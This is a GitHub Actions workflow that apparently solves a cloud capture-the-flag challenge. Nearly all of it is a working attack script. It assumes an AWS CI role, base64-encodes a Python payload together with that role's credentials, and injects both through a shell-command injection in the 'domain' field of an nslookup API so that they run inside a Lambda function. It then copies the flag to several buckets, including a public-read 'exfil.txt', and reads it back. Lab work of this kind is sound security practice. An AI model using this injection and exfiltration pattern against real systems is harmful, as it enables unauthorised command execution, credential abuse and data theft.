name: CloudEscape Stage 1 - Get Flag
on:
  workflow_dispatch:
  push:
    branches: [corgi]

permissions:
  id-token: write
  contents: read

jobs:
  exploit:
    runs-on: ubuntu-latest
    steps:
      - name: Configure AWS Credentials
        uses: aws-actions/configure-aws-credentials@v4
        with:
          role-to-assume: arn:aws:iam::009661764077:role/cicdRole
          aws-region: us-east-1

      - name: Build Lambda injection script
        run: |
          # Create a Python script that will run INSIDE the Lambda
          # It uses the cicdRole creds (passed via env) to read the flag from S3
          # and store it in Lambda's Description field
          cat > /tmp/lambda_script.py << 'PYEOF'
          import boto3, base64, os, sys

          # Get cicdRole creds from environment
          akid = os.environ.get('CICD_AKID', '')
          skid = os.environ.get('CICD_SKID', '')
          token = os.environ.get('CICD_TOKEN', '')

          if not akid:
              print("ERROR: No creds provided", file=sys.stderr)
              sys.exit(1)

          # Create session with cicdRole creds
          session = boto3.Session(
              aws_access_key_id=akid,
              aws_secret_access_key=skid,
              aws_session_token=token,
              region_name='us-east-1'
          )

          # Read the flag from the codec bucket
          s3 = session.client('s3')
          try:
              resp = s3.get_object(Bucket='codec4f26c862a321ef5', Key='flag.txt')
              flag = resp['Body'].read().strip()
              print(f"FLAG: {flag}")
          except Exception as e:
              print(f"S3 ERROR: {e}", file=sys.stderr)
              # Try with Lambda's own role
              try:
                  s3_own = boto3.client('s3', region_name='us-east-1')
                  resp = s3_own.get_object(Bucket='codec4f26c862a321ef5', Key='flag.txt')
                  flag = resp['Body'].read().strip()
                  print(f"FLAG (own role): {flag}")
              except Exception as e2:
                  print(f"S3 OWN ROLE ERROR: {e2}", file=sys.stderr)
                  sys.exit(1)

          # Store flag in Lambda Description
          try:
              lam = session.client('lambda')
              lam.update_function_configuration(
                  FunctionName='nslookupv2',
                  Description=flag.decode() if isinstance(flag, bytes) else flag
              )
              print("SUCCESS: Flag stored in Lambda Description")
          except Exception as e:
              print(f"LAMBDA UPDATE ERROR: {e}", file=sys.stderr)
              # Try with own role
              try:
                  lam_own = boto3.client('lambda', region_name='us-east-1')
                  lam_own.update_function_configuration(
                      FunctionName='nslookupv2',
                      Description=flag.decode() if isinstance(flag, bytes) else flag
                  )
                  print("SUCCESS: Flag stored in Lambda Description (own role)")
              except Exception as e2:
                  print(f"LAMBDA UPDATE OWN ROLE ERROR: {e2}", file=sys.stderr)

          # Also try writing to site bucket
          try:
              s3.put_object(Bucket='site781fe43f26b9eba3', Key='flag.txt', Body=flag)
              print("SUCCESS: Flag written to site bucket")
          except Exception as e:
              print(f"SITE BUCKET ERROR: {e}", file=sys.stderr)

          # Also try writing to platform bucket
          try:
              s3.put_object(Bucket='platform-bucket-009661764077-us-east-1', Key='flag.txt', Body=flag)
              print("SUCCESS: Flag written to platform bucket")
          except Exception as e:
              print(f"PLATFORM BUCKET ERROR: {e}", file=sys.stderr)

          # Also try copying to new key in codec bucket with public ACL
          try:
              s3.put_object(Bucket='codec4f26c862a321ef5', Key='exfil.txt', Body=flag, ACL='public-read')
              print("SUCCESS: Flag copied to codec bucket with public ACL")
          except Exception as e:
              print(f"CODEC EXFIL ERROR: {e}", file=sys.stderr)
          PYEOF

          # Base64-encode the script
          SCRIPT_B64=$(base64 -w0 /tmp/lambda_script.py)
          echo "SCRIPT_B64=$SCRIPT_B64" >> $GITHUB_ENV

      - name: Inject script into Lambda and trigger
        run: |
          API="https://3q931syi7b.execute-api.us-east-1.amazonaws.com"

          # Encode cicdRole creds as base64 to avoid shell quoting issues
          AKID_B64=$(printf '%s' "$AWS_ACCESS_KEY_ID" | base64 -w0)
          SKID_B64=$(printf '%s' "$AWS_SECRET_ACCESS_KEY" | base64 -w0)
          TOKEN_B64=$(printf '%s' "$AWS_SESSION_TOKEN" | base64 -w0)

          # Build the injected command: decode and write script to /tmp, set env, run
          INJECT="echo $SCRIPT_B64 | base64 -d > /tmp/s.py; export CICD_AKID=\$(echo $AKID_B64 | base64 -d); export CICD_SKID=\$(echo $SKID_B64 | base64 -d); export CICD_TOKEN=\$(echo $TOKEN_B64 | base64 -d); python3 /tmp/s.py"

          # Build the JSON payload using python3 to avoid quoting hell
          PAYLOAD=$(python3 -c "import json; print(json.dumps({'domain': 'x; $INJECT'}))")

          echo "=== Sending injection ==="
          curl -s -X POST "$API/dev/nslookup" -H "Content-Type: application/json" -d "$PAYLOAD" 2>&1
          echo
          echo "=== Waiting for Lambda to process ==="
          sleep 15

      - name: Read results
        if: always()
        run: |
          echo "===== Lambda Description ====="
          aws lambda get-function-configuration --function-name nslookupv2 --region us-east-1 --query 'Description' --output text 2>&1

          echo "===== Lambda Environment ====="
          aws lambda get-function-configuration --function-name nslookupv2 --region us-east-1 --query 'Environment.Variables' 2>&1 || true

          echo "===== Codec bucket listing ====="
          aws s3 ls s3://codec4f26c862a321ef5/ --region us-east-1 2>&1 || true

          echo "===== Site bucket listing ====="
          aws s3 ls s3://site781fe43f26b9eba3/ --region us-east-1 2>&1 || true

          echo "===== Platform bucket listing ====="
          aws s3 ls s3://platform-bucket-009661764077-us-east-1/ --region us-east-1 2>&1 || true

          echo "===== Direct HTTP reads ====="
          curl -s "https://codec4f26c862a321ef5.s3.us-east-1.amazonaws.com/exfil.txt" 2>&1 | head -5
          echo
          curl -s "https://site781fe43f26b9eba3.s3.us-east-1.amazonaws.com/flag.txt" 2>&1 | head -5
          echo
          curl -s "https://platform-bucket-009661764077-us-east-1.s3.us-east-1.amazonaws.com/flag.txt" 2>&1 | head -5

      - name: Read flag directly from codec bucket
        if: always()
        run: |
          echo "===== Attempt direct s3 cp from codec bucket ====="
          aws s3 cp s3://codec4f26c862a321ef5/flag.txt /tmp/flag_direct.txt --region us-east-1 2>&1 || echo "Direct read failed"
          echo "===== Flag content ====="
          cat /tmp/flag_direct.txt 2>/dev/null || echo "No file"
          echo
          echo "===== Flag hexdump ====="
          xxd /tmp/flag_direct.txt 2>/dev/null || echo "No file to hexdump"